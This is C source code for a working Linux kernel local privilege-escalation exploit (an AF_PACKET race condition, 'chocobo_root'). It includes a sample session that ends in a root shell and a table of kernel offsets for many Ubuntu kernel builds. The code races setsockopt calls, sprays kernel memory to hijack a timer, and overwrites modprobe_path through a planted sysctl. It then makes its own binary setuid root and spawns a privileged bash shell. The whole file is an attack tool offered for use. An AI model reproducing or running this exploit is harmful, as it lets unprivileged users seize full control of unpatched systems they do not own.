/*
chocobo_root.c
linux AF_PACKET race condition exploit
exploit for Ubuntu 16.04 x86_64

vroom vroom
*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
user@ubuntu:~$ uname -a
Linux ubuntu 4.4.0-51-generic #72-Ubuntu SMP Thu Nov 24 18:29:54 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
user@ubuntu:~$ id
uid=1000(user) gid=1000(user) groups=1000(user)
user@ubuntu:~$ gcc chocobo_root.c -o chocobo_root -lpthread
user@ubuntu:~$ ./chocobo_root
linux AF_PACKET race condition exploit by rebel
kernel version: 4.4.0-51-generic #72
proc_dostring = 0xffffffff81088090
modprobe_path = 0xffffffff81e48f80
register_sysctl_table = 0xffffffff812879a0
set_memory_rw = 0xffffffff8106f320
exploit starting
making vsyscall page writable..

new exploit attempt starting, jumping to 0xffffffff8106f320, arg=0xffffffffff600000
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 174222, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
vsyscall page altered!


stage 1 completed
registering new sysctl..

new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 30773, last val = 0)
current packet version = 2
pbd->hdr.bh1.offset_to_first_pkt = 48
race not won

retrying stage..
new exploit attempt starting, jumping to 0xffffffff812879a0, arg=0xffffffffff600850
sockets allocated
removing barrier and spraying..
version switcher stopping, x = -1 (y = 133577, last val = 2)
current packet version = 0
pbd->hdr.bh1.offset_to_first_pkt = 48
*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*
please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.
closing socket and verifying.......
sysctl added!

stage 2 completed
binary executed by kernel, launching rootshell
root@ubuntu:~# id
uid=0(root) gid=0(root) groups=0(root),1000(user)

*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=

There are offsets included for older kernels, but they're untested
so be aware that this exploit will probably crash kernels older than 4.4.

tested on:
Ubuntu 16.04: 4.4.0-51-generic
Ubuntu 16.04: 4.4.0-47-generic
Ubuntu 16.04: 4.4.0-36-generic
Ubuntu 14.04: 4.4.0-47-generic #68~14.04.1-Ubuntu

Shoutouts to:
jsc for inspiration (https://www.youtube.com/watch?v=x4UDIfcYMKI)
mcdelivery for delivering hotcakes and coffee

11/2016
by rebel
*/

#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <sys/wait.h>
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <poll.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/if_ether.h>
#include <sys/mman.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <linux/if_packet.h>
#include <pthread.h>
#include <linux/sched.h>
#include <netinet/tcp.h>
#include <sys/syscall.h>
#include <signal.h>
#include <sched.h>
#include <sys/utsname.h>

volatile int barrier = 1;
volatile int vers_switcher_done = 0;

struct offset {
    char *kernel_version;
    unsigned long proc_dostring;
    unsigned long modprobe_path;
    unsigned long register_sysctl_table;
    unsigned long set_memory_rw;
};


struct offset *off = NULL;

//99% of these offsets haven't actually been tested :)

struct offset offsets[] = {
    {"4.4.0-46-generic #67~14.04.1",0xffffffff810842f0,0xffffffff81e4b100,0xffffffff81274580,0xffffffff8106b880},
    {"4.4.0-47-generic #68~14.04.1",0,0,0,0},
    {"4.2.0-41-generic #48",0xffffffff81083470,0xffffffff81e48920,0xffffffff812775c0,0xffffffff8106c680},
    {"4.8.0-22-generic #24",0xffffffff8108ab70,0xffffffff81e47880,0xffffffff812b34b0,0xffffffff8106f0d0},
    {"4.2.0-34-generic #39",0xffffffff81082080,0xffffffff81c487e0,0xffffffff81274490,0xffffffff8106b5d0},
    {"4.2.0-30-generic #36",0xffffffff810820d0,0xffffffff81c487e0,0xffffffff812744e0,0xffffffff8106b620},
    {"4.2.0-16-generic #19",0xffffffff81081ac0,0xffffffff81c48680,0xffffffff812738f0,0xffffffff8106b110},
    {"4.2.0-17-generic #21",0,0,0,0},
    {"4.2.0-18-generic #22",0,0,0,0},
    {"4.2.0-19-generic #23~14.04.1",0xffffffff8107d640,0xffffffff81c497c0,0xffffffff8125de30,0xffffffff81067750},
    {"4.2.0-21-generic #25~14.04.1",0,0,0,0},
    {"4.2.0-30-generic #36~14.04.1",0xffffffff8107da40,0xffffffff81c4a8e0,0xffffffff8125dd40,0xffffffff81067b20},
    {"4.2.0-27-generic #32~14.04.1",0xffffffff8107dbe0,0xffffffff81c498c0,0xffffffff8125e420,0xffffffff81067c60},
    {"4.2.0-36-generic #42",0xffffffff81083430,0xffffffff81e488e0,0xffffffff81277380,0xffffffff8106c680},
    {"4.4.0-22-generic #40",0xffffffff81087d40,0xffffffff81e48f00,0xffffffff812864d0,0xffffffff8106f370},
    {"4.2.0-18-generic #22~14.04.1",0xffffffff8107d620,0xffffffff81c49780,0xffffffff8125dd10,0xffffffff81067760},
    {"4.4.0-34-generic #53",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286ed0,0xffffffff8106f370},
    {"4.2.0-22-generic #27",0xffffffff81081ad0,0xffffffff81c486c0,0xffffffff81273b20,0xffffffff8106b100},
    {"4.2.0-23-generic #28",0,0,0,0},
    {"4.2.0-25-generic #30",0,0,0,0},
    {"4.4.0-36-generic #55",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286e50,0xffffffff8106f360},
    {"4.2.0-42-generic #49",0xffffffff81083490,0xffffffff81e489a0,0xffffffff81277870,0xffffffff8106c680},
    {"4.4.0-31-generic #50",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286e90,0xffffffff8106f370},
    {"4.4.0-22-generic #40~14.04.1",0xffffffff81084250,0xffffffff81c4b080,0xffffffff81273de0,0xffffffff8106b9d0},
    {"4.2.0-38-generic #45",0xffffffff810833d0,0xffffffff81e488e0,0xffffffff81277410,0xffffffff8106c680},
    {"4.4.0-45-generic #66",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874c0,0xffffffff8106f320},
    {"4.2.0-36-generic #42~14.04.1",0xffffffff8107ffd0,0xffffffff81c499e0,0xffffffff81261ea0,0xffffffff81069d00},
    {"4.4.0-45-generic #66~14.04.1",0xffffffff81084260,0xffffffff81e4b100,0xffffffff81274340,0xffffffff8106b880},
    {"4.2.0-22-generic #27~14.04.1",0xffffffff8107d640,0xffffffff81c497c0,0xffffffff8125deb0,0xffffffff81067750},
    {"4.2.0-25-generic #30~14.04.1",0,0,0,0},
    {"4.2.0-23-generic #28~14.04.1",0,0,0,0},
    {"4.4.0-46-generic #67",0xffffffff81088040,0xffffffff81e48f80,0xffffffff81287800,0xffffffff8106f320},
    {"4.4.0-47-generic #68",0,0,0,0},
    {"4.4.0-34-generic #53~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c40,0xffffffff8106b880},
    {"4.4.0-36-generic #55~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c60,0xffffffff8106b890},
    {"4.4.0-31-generic #50~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273c20,0xffffffff8106b880},
    {"4.2.0-38-generic #45~14.04.1",0xffffffff8107fdc0,0xffffffff81c4a9e0,0xffffffff81261540,0xffffffff81069bf0},
    {"4.2.0-35-generic #40",0xffffffff81083430,0xffffffff81e48860,0xffffffff81277240,0xffffffff8106c680},
    {"4.4.0-24-generic #43~14.04.1",0xffffffff81084120,0xffffffff81c4b080,0xffffffff812736f0,0xffffffff8106b880},
    {"4.4.0-21-generic #37",0xffffffff81087cf0,0xffffffff81e48e80,0xffffffff81286310,0xffffffff8106f370},
    {"4.2.0-34-generic #39~14.04.1",0xffffffff8107dc50,0xffffffff81c498e0,0xffffffff8125e830,0xffffffff81067c90},
    {"4.4.0-24-generic #43",0xffffffff81087e60,0xffffffff81e48f00,0xffffffff812868f0,0xffffffff8106f370},
    {"4.4.0-21-generic #37~14.04.1",0xffffffff81084220,0xffffffff81c4b000,0xffffffff81273a30,0xffffffff8106b9d0},
    {"4.2.0-41-generic #48~14.04.1",0xffffffff8107fe20,0xffffffff81c4aa20,0xffffffff812616c0,0xffffffff81069bf0},
    {"4.8.0-27-generic #29",0xffffffff8108ab70,0xffffffff81e47880,0xffffffff812b3490,0xffffffff8106f0d0},
    {"4.8.0-26-generic #28",0,0,0,0},
    {"4.4.0-38-generic #57",0xffffffff81087f70,0xffffffff81e48f80,0xffffffff81287470,0xffffffff8106f360},
    {"4.4.0-42-generic #62~14.04.1",0xffffffff81084260,0xffffffff81e4b100,0xffffffff81274300,0xffffffff8106b880},
    {"4.4.0-38-generic #57~14.04.1",0xffffffff81084210,0xffffffff81e4b100,0xffffffff812742e0,0xffffffff8106b890},
    {"4.4.0-49-generic #70",0xffffffff81088090,0xffffffff81e48f80,0xffffffff81287d40,0xffffffff8106f320},
    {"4.4.0-49-generic #70~14.04.1",0xffffffff81084350,0xffffffff81e4b100,0xffffffff81274b10,0xffffffff8106b880},
    {"4.2.0-21-generic #25",0xffffffff81081ad0,0xffffffff81c486c0,0xffffffff81273aa0,0xffffffff8106b100},
    {"4.2.0-19-generic #23",0,0,0,0},
    {"4.2.0-42-generic #49~14.04.1",0xffffffff8107fe20,0xffffffff81c4aaa0,0xffffffff81261980,0xffffffff81069bf0},
    {"4.4.0-43-generic #63",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874b0,0xffffffff8106f320},
    {"4.4.0-28-generic #47",0xffffffff81087ea0,0xffffffff81e48f80,0xffffffff81286df0,0xffffffff8106f370},
    {"4.4.0-28-generic #47~14.04.1",0xffffffff81084160,0xffffffff81c4b100,0xffffffff81273b70,0xffffffff8106b880},
    {"4.9.0-1-generic #2",0xffffffff8108bbe0,0xffffffff81e4ac20,0xffffffff812b8400,0xffffffff8106f390},
    {"4.8.0-28-generic #30",0xffffffff8108ae10,0xffffffff81e48b80,0xffffffff812b3690,0xffffffff8106f0e0},
    {"4.2.0-35-generic #40~14.04.1",0xffffffff8107fff0,0xffffffff81c49960,0xffffffff81262320,0xffffffff81069d20},
    {"4.2.0-27-generic #32",0xffffffff810820c0,0xffffffff81c487c0,0xffffffff81274150,0xffffffff8106b620},
    {"4.4.0-42-generic #62",0xffffffff81087fc0,0xffffffff81e48f80,0xffffffff812874a0,0xffffffff8106f320},
    {"4.4.0-51-generic #72",0xffffffff81088090,0xffffffff81e48f80,0xffffffff812879a0,0xffffffff8106f320},
//{"4.8.6-300.fc25.x86_64 #1 SMP Tue Nov 1 12:36:38 UTC 2016",0xffffffff9f0a8b30,0xffffffff9fe40940,0xffffffff9f2cfbf0,0xffffffff9f0663b0},
    {NULL,0,0,0,0}
};

#define VSYSCALL 0xffffffffff600000

#define PAD 64

int pad_fds[PAD];

struct ctl_table {
    const char *procname;
    void *data;
    int maxlen;
    unsigned short mode;
    struct ctl_table *child;
    void *proc_handler;
    void *poll;
    void *extra1;
    void *extra2;
};

#define CONF_RING_FRAMES 1

struct tpacket_req3 tp;
int sfd;
int mapped = 0;

struct timer_list {
    void *next;
    void *prev;
    unsigned long           expires;
    void                    (*function)(unsigned long);
    unsigned long           data;
    unsigned int                     flags;
    int                     slack;
};

void *setsockopt_thread(void *arg)
{
    while(barrier) {
    }
    setsockopt(sfd, SOL_PACKET, PACKET_RX_RING, (void*) &tp, sizeof(tp));

    return NULL;
}

void *vers_switcher(void *arg)
{
    int val,x,y;

    while(barrier) {}

    while(1) {
        val = TPACKET_V1;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        y++;

        if(x != 0) break;

        val = TPACKET_V3;
        x = setsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

        if(x != 0) break;

        y++;
    }

    fprintf(stderr,"version switcher stopping, x = %d (y = %d, last val = %d)\n",x,y,val);
    vers_switcher_done = 1;


    return NULL;
}

#define BUFSIZE 1408
char exploitbuf[BUFSIZE];

void kmalloc(void)
{
    while(1)
        syscall(__NR_add_key, "user","wtf",exploitbuf,BUFSIZE-24,-2);
}


void pad_kmalloc(void)
{
    int x;

    for(x=0; x<PAD; x++)
        if(socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP)) == -1) {
            fprintf(stderr,"pad_kmalloc() socket error\n");
            exit(1);
        }

}

int try_exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    pthread_t setsockopt_thread_thread,a;
    int val;
    socklen_t l;
    struct timer_list *timer;
    int fd;
    struct tpacket_block_desc *pbd;
    int off;
    sigset_t set;

    sigemptyset(&set);

    sigaddset(&set, SIGSEGV);

    if(pthread_sigmask(SIG_BLOCK, &set, NULL) != 0) {
        fprintf(stderr,"couldn't set sigmask\n");
        exit(1);
    }

    fprintf(stderr,"new exploit attempt starting, jumping to %p, arg=%p\n",(void *)func,(void *)arg);

    pad_kmalloc();

    fd=socket(AF_PACKET,SOCK_DGRAM,htons(ETH_P_ARP));

    if (fd==-1) {
        printf("target socket error\n");
        exit(1);
    }

    pad_kmalloc();

    fprintf(stderr,"sockets allocated\n");

    val = TPACKET_V3;

    setsockopt(fd, SOL_PACKET, PACKET_VERSION, &val, sizeof(val));

    tp.tp_block_size = CONF_RING_FRAMES * getpagesize();
    tp.tp_block_nr = 1;
    tp.tp_frame_size = getpagesize();
    tp.tp_frame_nr = CONF_RING_FRAMES;

//try to set the timeout to 10 seconds
//the default timeout might still be used though depending on when the race was won
    tp.tp_retire_blk_tov = 10000;

    sfd = fd;

    if(pthread_create(&setsockopt_thread_thread, NULL, setsockopt_thread, (void *)NULL)) {
        fprintf(stderr, "Error creating thread\n");
        return 1;
    }


    pthread_create(&a, NULL, vers_switcher, (void *)NULL);

    usleep(200000);

    fprintf(stderr,"removing barrier and spraying..\n");

    memset(exploitbuf,'\x00',BUFSIZE);

    timer = (struct timer_list *)(exploitbuf+(0x6c*8)+6-8);
    timer->next = 0;
    timer->prev = 0;

    timer->expires = 4294943360;
    timer->function = (void *)func;
    timer->data = arg;
    timer->flags = 1;
    timer->slack = -1;


    barrier = 0;

    usleep(100000);

    while(!vers_switcher_done)usleep(100000);

    l = sizeof(val);
    getsockopt(sfd, SOL_PACKET, PACKET_VERSION, &val, &l);

    fprintf(stderr,"current packet version = %d\n",val);

    pbd = mmap(0, tp.tp_block_size * tp.tp_block_nr, PROT_READ | PROT_WRITE, MAP_SHARED, sfd, 0);


    if(pbd == MAP_FAILED) {
        fprintf(stderr,"could not map pbd\n");
        exit(1);
    }

    else {
        off = pbd->hdr.bh1.offset_to_first_pkt;
        fprintf(stderr,"pbd->hdr.bh1.offset_to_first_pkt = %d\n",off);
    }


    if(val == TPACKET_V1 && off != 0) {
        fprintf(stderr,"*=*=*=* TPACKET_V1 && offset_to_first_pkt != 0, race won *=*=*=*\n");
    }

    else {
        fprintf(stderr,"race not won\n");
        exit(2);
    }

    munmap(pbd, tp.tp_block_size * tp.tp_block_nr);

    pthread_create(&a, NULL, verification_func, (void *)NULL);

    fprintf(stderr,"please wait up to a few minutes for timer to be executed. if you ctrl-c now the kernel will hang. so don't do that.\n");
    sleep(1);
    fprintf(stderr,"closing socket and verifying..");

    close(sfd);

    kmalloc();

    fprintf(stderr,"all messages sent\n");

    sleep(31337);
    exit(1);
}


int verification_result = 0;

void catch_sigsegv(int sig)
{
    verification_result = 0;
    pthread_exit((void *)1);
}


void *modify_vsyscall(void *arg)
{
    unsigned long *vsyscall = (unsigned long *)(VSYSCALL+0x850);
    unsigned long x = (unsigned long)arg;

    sigset_t set;
    sigemptyset(&set);
    sigaddset(&set, SIGSEGV);

    if(pthread_sigmask(SIG_UNBLOCK, &set, NULL) != 0) {
        fprintf(stderr,"couldn't set sigmask\n");
        exit(1);
    }

    signal(SIGSEGV, catch_sigsegv);

    *vsyscall = 0xdeadbeef+x;

    if(*vsyscall == 0xdeadbeef+x) {
        fprintf(stderr,"\nvsyscall page altered!\n");
        verification_result = 1;
        pthread_exit(0);
    }

    return NULL;
}

void verify_stage1(void)
{
    int x;
    pthread_t v_thread;

    sleep(5);

    for(x=0; x<300; x++) {

        pthread_create(&v_thread, NULL, modify_vsyscall, 0);

        pthread_join(v_thread, NULL);

        if(verification_result == 1) {
            exit(0);
        }

        write(2,".",1);
        sleep(1);
    }

    printf("could not modify vsyscall\n");

    exit(1);
}

void verify_stage2(void)
{
    int x;
    struct stat b;

    sleep(5);

    for(x=0; x<300; x++) {

        if(stat("/proc/sys/hack",&b) == 0) {
            fprintf(stderr,"\nsysctl added!\n");
            exit(0);
        }

        write(2,".",1);
        sleep(1);
    }

    printf("could not add sysctl\n");
    exit(1);


}

void exploit(unsigned long func, unsigned long arg, void *verification_func)
{
    int status;
    int pid;

retry:

    pid = fork();

    if(pid == 0) {
        try_exploit(func, arg, verification_func);
        exit(1);
    }

    wait(&status);

    printf("\n");

    if(WEXITSTATUS(status) == 2) {
        printf("retrying stage..\n");
        kill(pid, 9);
        sleep(2);
        goto retry;
    }

    else if(WEXITSTATUS(status) != 0) {
        printf("something bad happened, aborting exploit attempt\n");
        exit(-1);
    }



    kill(pid, 9);
}


void wrapper(void)
{
    struct ctl_table *c;

    fprintf(stderr,"exploit starting\n");
    printf("making vsyscall page writable..\n\n");

    exploit(off->set_memory_rw, VSYSCALL, verify_stage1);

    printf("\nstage 1 completed\n");

    sleep(5);

    printf("registering new sysctl..\n\n");

    c = (struct ctl_table *)(VSYSCALL+0x850);

    memset((char *)(VSYSCALL+0x850), '\x00', 1952);

    strcpy((char *)(VSYSCALL+0xf00),"hack");
    memcpy((char *)(VSYSCALL+0xe00),"\x01\x00\x00\x00",4);
    c->procname = (char *)(VSYSCALL+0xf00);
    c->mode = 0666;
    c->proc_handler = (void *)(off->proc_dostring);
    c->data = (void *)(off->modprobe_path);
    c->maxlen=256;
    c->extra1 = (void *)(VSYSCALL+0xe00);
    c->extra2 = (void *)(VSYSCALL+0xd00);

    exploit(off->register_sysctl_table, VSYSCALL+0x850, verify_stage2);

    printf("stage 2 completed\n");
}

void launch_rootshell(void)
{
    int fd;
    char buf[256];
    struct stat s;


    fd = open("/proc/sys/hack",O_WRONLY);

    if(fd == -1) {
        fprintf(stderr,"could not open /proc/sys/hack\n");
        exit(-1);
    }

    memset(buf,'\x00', 256);

    readlink("/proc/self/exe",(char *)&buf,256);

    write(fd,buf,strlen(buf)+1);

    socket(AF_INET,SOCK_STREAM,132);

    if(stat(buf,&s) == 0 && s.st_uid == 0) {
        printf("binary executed by kernel, launching rootshell\n");
        lseek(fd, 0, SEEK_SET);
        write(fd,"/sbin/modprobe",15);
        close(fd);
        execl(buf,buf,NULL);
    }

    else
        printf("could not create rootshell\n");


}

int main(int argc, char **argv)
{
    int status, pid;
    struct utsname u;
    int i, crash = 0;
    char buf[512], *f;


    if(argc == 2 && !strcmp(argv[1],"crash")) {
        crash = 1;
    }


    if(getuid() == 0 && geteuid() == 0 && !crash) {
        chown("/proc/self/exe",0,0);
        chmod("/proc/self/exe",06755);
        exit(-1);
    }

    else if(getuid() != 0 && geteuid() == 0 && !crash) {
        setresuid(0,0,0);
        setresgid(0,0,0);
        execl("/bin/bash","bash","-p",NULL);
        exit(0);
    }

    fprintf(stderr,"linux AF_PACKET race condition exploit by rebel\n");

    uname(&u);

    if((f = strstr(u.version,"-Ubuntu")) != NULL) *f = '\0';

    snprintf(buf,512,"%s %s",u.release,u.version);

    printf("kernel version: %s\n",buf);


    for(i=0; offsets[i].kernel_version != NULL; i++) {
        if(!strcmp(offsets[i].kernel_version,buf)) {

            while(offsets[i].proc_dostring == 0)
                i--;

            off = &offsets[i];
            break;
        }
    }

    if(crash) {
        off = &offsets[0];
        off->set_memory_rw = 0xffffffff41414141;
    }

    if(off) {
        printf("proc_dostring = %p\n",(void *)off->proc_dostring);
        printf("modprobe_path = %p\n",(void *)off->modprobe_path);
        printf("register_sysctl_table = %p\n",(void *)off->register_sysctl_table);
        printf("set_memory_rw = %p\n",(void *)off->set_memory_rw);
    }

    if(!off) {
        fprintf(stderr,"i have no offsets for this kernel version..\n");
        exit(-1);
    }

    pid = fork();

    if(pid == 0) {
        if(unshare(CLONE_NEWUSER) != 0)
            fprintf(stderr, "failed to create new user namespace\n");

        if(unshare(CLONE_NEWNET) != 0)
            fprintf(stderr, "failed to create new network namespace\n");

        wrapper();
        exit(0);
    }

    waitpid(pid, &status, 0);

    launch_rootshell();
    return 0;
}